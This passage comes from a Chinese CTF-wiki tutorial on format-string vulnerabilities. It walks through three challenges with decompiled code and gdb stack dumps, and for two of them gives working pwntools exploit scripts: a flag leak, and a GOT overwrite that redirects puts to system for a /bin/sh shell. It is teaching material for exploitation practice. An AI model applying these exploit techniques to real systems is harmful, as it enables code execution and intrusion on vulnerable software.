\n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206RELRO\u4fdd\u62a4\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e\n\n\n  \nfor\n \n(\n \nj\n \n=\n \n0\n;\n \nj\n \n=\n \n21\n;\n \n++\nj\n \n)\n\n  \n{\n\n    \nv5\n \n=\n \nformat\n[\nj\n];\n\n    \nif\n \n(\n \n!\nv5\n \n||\n \nv11\n[\nj\n]\n \n!=\n \nv5\n \n)\n\n    \n{\n\n      \nputs\n(\nYou answered:\n);\n\n      \nprintf\n(\nformat\n);\n\n      \nputs\n(\n\\n\nBut that was totally wrong lol get rekt\n);\n\n      \nfflush\n(\n_bss_start\n);\n\n      \nresult\n \n=\n \n0\n;\n\n      \ngoto\n \nLABEL_11\n;\n\n    \n}\n\n  \n}\n\n\n\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u6211\u4eec\u5728printf\u5904\u4e0b\u504f\u79fb\u5982\u4e0b,\u8fd9\u91cc\u53ea\u5173\u6ce8\u4ee3\u7801\u90e8\u5206\u4e0e\u6808\u90e8\u5206\u3002\n\n\ngef\u27a4  b \nprintf\n\nBreakpoint \n1\n at 0x400640\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck \nwhat\ns the flag\n\n\n123456\n\n\nYou answered:\n\n\n\nBreakpoint 1, __printf (format=0x602830 \n123456\n) at printf.c:28\n\n\n28  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n\n\n   0x7ffff7a627f7 \nfprintf+135\n    add    rsp, 0xd8\n\n\n   0x7ffff7a627fe \nfprintf+142\n    ret    \n\n\n   0x7ffff7a627ff                  nop    \n\n\n \u2192 0x7ffff7a62800 \nprintf+0\n       sub    rsp, 0xd8\n\n\n   0x7ffff7a62807 \nprintf+7\n       test   al, al\n\n\n   0x7ffff7a62809 \nprintf+9\n       mov    QWORD PTR [rsp+0x28], rsi\n\n\n   0x7ffff7a6280e \nprintf+14\n      mov    QWORD PTR [rsp+0x30], rdx\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n\n\n[\n0x7fffffffdb08\n, \nl8\n]\n\n\n8\n\n0x00007fffffffdb08\u2502+0x00: 0x0000000000400890  \u2192  \nmain+234\n mov edi, 0x4009b8    \u2190 \n$rsp\n\n0x00007fffffffdb10\u2502+0x08: 0x0000000031000001\n0x00007fffffffdb18\u2502+0x10: 0x0000000000602830  \u2192  0x0000363534333231 \n(\n123456\n?\n)\n\n0x00007fffffffdb20\u2502+0x18: 0x0000000000602010  \u2192  \nYou answered:\\ng\n\n0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30  \u2192  \nflag{11111111111111111\n\n0x00007fffffffdb30\u2502+0x28: \nflag{11111111111111111\n\n0x00007fffffffdb38\u2502+0x30: \n11111111111111\n\n0x00007fffffffdb40\u2502+0x38: 0x0000313131313131 \n(\n111111\n?\n)\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n trace \n]\n\u2500\u2500\u2500\u2500\n\n[\n#0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830 \n123456\n)\n\n\n[\n#1] 0x400890 \u2192 Name: main()\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\n\n\n\u53ef\u4ee5\u770b\u5230flag\u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d6\u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt\u5b57\u7b26\u4e32\u5b58\u50a8\u5728RDI\u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5fmt\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a10\u3002\u800cfmt\u5b57\u7b26\u4e32\u4e2d%order\ns\u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165%9\\\ns\u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165%9\\\ns\u5373\u53ef\u5f97\u5230flag\u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528https://github.com/scwuaptx/Pwngdb\u4e2d\u7684fmtarg\u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002\n\n\ngef\u27a4  fmtarg 0x00007fffffffdb28\nThe index of format argument : \n10\n\n\n\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987bbreak\u5728printf\u5904\u3002\n\n\n\u5229\u7528\u7a0b\u5e8f\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \n*\n\n\ngoodluck\n \n=\n \nELF\n(\n./goodluck\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\npwn.sniperoj.cn\n,\n \n30017\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./goodluck\n)\n\n\npayload\n \n=\n \n%9$s\n\n\nprint\n \npayload\n\n\n##gdb.attach(sh)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nprint\n \nsh\n.\nrecv\n()\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\nhijack GOT\n\n\n\u539f\u7406\n\n\n\u5728\u76ee\u524d\u7684C\u7a0b\u5e8f\u4e2d\uff0clibc\u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7GOT\u8868\u6765\u8df3\u8f6c\u7684\u3002\u6b64\u5916\uff0c\u5728 \u6ca1\u6709\u5f00\u542fRELRO\u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2alibc\u7684\u51fd\u6570\u5bf9\u5e94\u7684GOT\u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2alibc\u51fd\u6570\u7684GOT\u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539printf\u7684got\u8868\u9879\u5185\u5bb9\u4e3asystem\u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884cprintf\u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002\n\n\n\u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570A\u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570B\u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4\n\n\n\n\n\n\n\u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u3002\n\n\n\n\n\u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570A\u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002\n\n\n\n\n\n\n\n\n\u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\n\n\n\n\n\u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570B\u7684\u5730\u5740\u3002\n\n\n\n\n\n\n\n\n\u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002\n\n\n\n\n\n\n\u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd\n\n\n\n\n\u5199\u5165\u51fd\u6570\uff1awrite\u51fd\u6570\u3002\n\n\nROP\n\n\n\n\npop eax; ret;           # printf@got -\n eax\npop ebx; ret;           # (addr_offset = system_addr - printf_addr) -\n ebx\nadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199\n\n\n\n\n\n\n\n\n\n\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee52016 CCTF\u4e2d\u7684pwn3\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u5982\u4e0b\n\n\n\u279c  \n2016\n-CCTF-pwn3 git:\n(\nmaster\n)\n \u2717 checksec pwn3 \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542fASLR\u4fdd\u62a4\u7684\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684ftp\uff0c\u5177\u6709get\uff0cput\uff0cdir\u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728get\u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\nint\n \nget_file\n()\n\n\n{\n\n  \nchar\n \ndest\n;\n \n// [sp+1Ch] [bp-FCh]@5\n\n  \nchar\n \ns1\n;\n \n// [sp+E4h] [bp-34h]@1\n\n  \nchar\n \n*\ni\n;\n \n// [sp+10Ch] [bp-Ch]@3\n\n\n  \nprintf\n(\nenter the file name you want to get:\n);\n\n  \n__isoc99_scanf\n(\n%40s\n,\n \ns1\n);\n\n  \nif\n \n(\n \n!\nstrncmp\n(\ns1\n,\n \nflag\n,\n \n4u\n)\n \n)\n\n    \nputs\n(\ntoo young, too simple\n);\n\n  \nfor\n \n(\n \ni\n \n=\n \n(\nchar\n \n*\n)\nfile_head\n;\n \ni\n;\n \ni\n \n=\n \n(\nchar\n \n*\n)\n*\n((\n_DWORD\n \n*\n)\ni\n \n+\n \n60\n)\n \n)\n\n  \n{\n\n    \nif\n \n(\n \n!\nstrcmp\n(\ni\n,\n \ns1\n)\n \n)\n\n    \n{\n\n      \nstrcpy\n(\ndest\n,\n \ni\n \n+\n \n0x28\n);\n\n      \nreturn\n \nprintf\n(\ndest\n);\n\n    \n}\n\n  \n}\n\n  \nreturn\n \nprintf\n(\ndest\n);\n\n\n}\n\n\n\n\n\n\u6f0f\u6d1e\u5229\u7528\u601d\u8def\n\n\n\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def\n\n\n\n\n\u7ed5\u8fc7\u5bc6\u7801\n\n\n\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb\n\n\n\u5229\u7528put@got\u83b7\u53d6put\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684libc.so\u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94system\u51fd\u6570\u5730\u5740\u3002\n\n\n\u4fee\u6539puts@got\u7684\u5185\u5bb9\u4e3asystem\u7684\u5730\u5740\u3002\n\n\n\u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884cputs\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002\n\n\n\n\n\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f\n\n\n\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\n##context.log_level = \ndebug\n\n\npwn3\n \n=\n \nELF\n(\n./pwn3\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \nsh\n \n=\n \nremote\n(\n111\n,\n \n111\n)\n\n\nelse\n:\n\n    \nsh\n \n=\n \nprocess\n(\n./pwn3\n)\n\n\n\n\ndef\n \nget\n(\nname\n):\n\n    \nsh\n.\nsendline\n(\nget\n)\n\n    \nsh\n.\nrecvuntil\n(\nenter the file name you want to get:\n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n    \ndata\n \n=\n \nsh\n.\nrecv\n()\n\n    \nreturn\n \ndata\n\n\n\n\ndef\n \nput\n(\nname\n,\n \ncontent\n):\n\n    \nsh\n.\nsendline\n(\nput\n)\n\n    \nsh\n.\nrecvuntil\n(\nplease enter the name of the file you want to upload:\n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n    \nsh\n.\nrecvuntil\n(\nthen, enter the content:\n)\n\n    \nsh\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nshow_dir\n():\n\n    \nsh\n.\nsendline\n(\ndir\n)\n\n\n\n\ntmp\n \n=\n \nsysbdmin\n\n\nname\n \n=\n \n\n\nfor\n \ni\n \nin\n \ntmp\n:\n\n    \nname\n \n+=\n \nchr\n(\nord\n(\ni\n)\n \n-\n \n1\n)\n\n\n\n\n## password\n\n\ndef\n \npassword\n():\n\n    \nsh\n.\nrecvuntil\n(\nName (ftp.hacker.server:Rainism):\n)\n\n    \nsh\n.\nsendline\n(\nname\n)\n\n\n\n\n##password\n\n\npassword\n()\n\n\n## get the addr of puts\n\n\nputs_got\n \n=\n \npwn3\n.\ngot\n[\nputs\n]\n\n\nlog\n.\nsuccess\n(\nputs got : \n \n+\n \nhex\n(\nputs_got\n))\n\n\nput\n(\n1111\n,\n \n%8$s\n \n+\n \np32\n(\nputs_got\n))\n\n\nputs_addr\n \n=\n \nu32\n(\nget\n(\n1111\n)[:\n4\n])\n\n\n\n## get addr of system\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nputs\n,\n \nputs_addr\n)\n\n\nsystem_offset\n \n=\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nputs_offset\n \n=\n \nlibc\n.\ndump\n(\nputs\n)\n\n\nsystem_addr\n \n=\n \nputs_addr\n \n-\n \nputs_offset\n \n+\n \nsystem_offset\n\n\nlog\n.\nsuccess\n(\nsystem addr : \n \n+\n \nhex\n(\nsystem_addr\n))\n\n\n\n## modify puts@got, point to system_addr\n\n\npayload\n \n=\n \nfmtstr_payload\n(\n7\n,\n \n{\nputs_got\n:\n \nsystem_addr\n})\n\n\nput\n(\n/bin/sh;\n,\n \npayload\n)\n\n\nsh\n.\nrecvuntil\n(\nftp\n)\n\n\nsh\n.\nsendline\n(\nget\n)\n\n\nsh\n.\nrecvuntil\n(\nenter the file name you want to get:\n)\n\n\n##gdb.attach(sh)\n\n\nsh\n.\nsendline\n(\n/bin/sh;\n)\n\n\n\n## system(\n/bin/sh\n)\n\n\nshow_dir\n()\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u6ce8\u610f\n\n\n\n\n\u6211\u5728\u83b7\u53d6puts\u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d4\u4e2a\u5b57\u8282\u5c31\u662fputs\u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f7\u3002\n\n\n\u8fd9\u91cc\u6211\u5229\u7528\u4e86pwntools\u4e2d\u7684fmtstr_payload\u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91ccfmtstr_payload(7, {puts_got: system_addr})\u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f7\uff0c\u6211\u5e0c\u671b\u5728puts_got\u5730\u5740\u5904\u5199\u5165system_addr\u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002\n\n\n\n\nhijack retaddr\n\n\n\u539f\u7406\n\n\n\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5\u4e09\u4e2a\u767d\u5e3d-pwnme_k0\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u279c  \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git:\n(\nmaster\n)\n \u2717 checksec pwnme_k0\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53caFull RELRO\u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684got\u8868\u4e86\u3002\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\n\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\nint\n \n__usercall\n \nsub_400B07\n@\neax\n(\nchar\n \nformat\n@\ndil\n,\n \nchar\n \nformata\n,\n \n__int64\n \na3\n,\n \nchar\n \na4\n)\n\n\n{\n\n  \nwrite\n(\n0\n,\n \nWelc0me to sangebaimao!\n\\n\n,\n \n0x1AuLL\n);\n\n  \nprintf\n(\nformata\n,\n \nWelc0me to sangebaimao!\n\\n\n);\n\n  \nreturn\n \nprintf\n(\na4\n \n+\n \n4\n);\n\n\n}\n\n\n\n\n\n\u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a\na4+4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684passwrod\u5185\u5bb9\u4e5f\u662f\n\n\n    \nv6\n \n=\n \nread\n(\n0\n,\n \n(\nchar\n \n*\n)\na4\n \n+\n \n4\n,\n \n0x14uLL\n);\n\n\n\n\n\n\u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684username\u5728\u8ddd\u79bb\u7684password20\u4e2a\u5b57\u8282\u3002\n\n\n  \nputs\n(\nInput your username(max lenth:20): \n);\n\n  \nfflush\n(\nstdout\n);\n\n  \nv8\n \n=\n \nread\n(\n0\n,\n \nbufa\n,\n \n0x14uLL\n);\n\n  \nif\n \n(\n \nv8\n \n \nv8\n \n=\n \n0x14u\n \n)\n\n  \n{\n\n    \nputs\n(\nInput your password(max lenth:20): \n);\n\n    \nfflush\n(\nstdout\n);\n\n    \nv6\n \n=\n \nread\n(\n0\n,\n \n(\nchar\n \n*\n)\na4\n \n+\n \n4\n,\n \n0x14uLL\n);\n\n    \nfflush\n(\nstdout\n);\n\n    \n*\n(\n_QWORD\n \n*\n)\nbuf\n \n=\n \nbufa\n;\n\n    \n*\n(\n_QWORD\n \n*\n)(\nbuf\n \n+\n \n8\n)\n \n=\n \na3\n;\n\n    \n*\n(\n_QWORD\n \n*\n)(\nbuf\n \n+\n \n16\n)\n \n=\n \na4\n;\n\n\n\n\n\n\u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002\n\n\n\u5229\u7528\u601d\u8def\n\n\n\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u572800000000004008A6\u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528system('bin/sh')\u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86shell\u3002\n\n\n\u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8erbp\u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u83b7\u53d6\u51fd\u6570\u7684rbp\u4e0e\u8fd4\u56de\u5730\u5740\n\n\n\u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\n\n\n\u5c06\u6267\u884csystem\u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\n\n\n\n\n\u786e\u5b9a\u504f\u79fb\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540daaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2aprintf(\na4 + 4)\u51fd\u6570\u5904\n\n\nRegister Account first!\nInput your username(max lenth:20): \naaaaaaaa\nInput your password(max lenth:20): \n%p%p%p%p%p%p%p%p%p%p\nRegister Success!!\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:(\n\nerror options\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:(\n\n1\n...\n\n\n\n\n\u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n     0x400b1a                  call   0x400758\n     0x400b1f                  lea    rdi, [rbp+0x10]\n     0x400b23                  mov    eax, 0x0\n \u2192   0x400b28                  